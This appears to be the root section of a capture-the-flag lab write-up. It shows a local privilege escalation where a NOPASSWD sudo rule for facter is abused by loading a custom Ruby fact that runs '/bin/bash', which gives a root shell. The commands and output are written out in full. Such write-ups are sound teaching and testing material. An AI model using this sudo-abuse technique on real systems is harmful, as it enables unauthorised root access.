# Root
Taking a look around we can run `facter` as any user without a password.
```bash
trivia@facts:/tmp$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    (ALL) NOPASSWD: /usr/bin/facter
```

Facter is a facts gathering tool made by [puppetlabs](https://github.com/puppetlabs/facter) taking a look around we can see that we can add [custom facts](https://help.puppet.com/core//current/Content/PuppetCore/custom_facts.htm) which execute `Ruby` code. We can [load the custom facts](https://help.puppet.com/core//current/Content/PuppetCore/loading_custom_facts.htm) using the `--custom-dir` command line option. Let's write a simple `Ruby` script that nets us a shell as root and execute `facter`.
```bash
trivia@facts:/tmp$ echo 'exec "/bin/bash"' >w1ld.rb
trivia@facts:/tmp$ sudo facter --custom-dir /tmp 0xw1ld
root@facts:/tmp# ls -lash /root/root.txt
4.0K -rw-r----- 1 root root 33 Jan 31 22:50 /root/root.txt
```

Just like that, we have Root!

# Beyond-Root
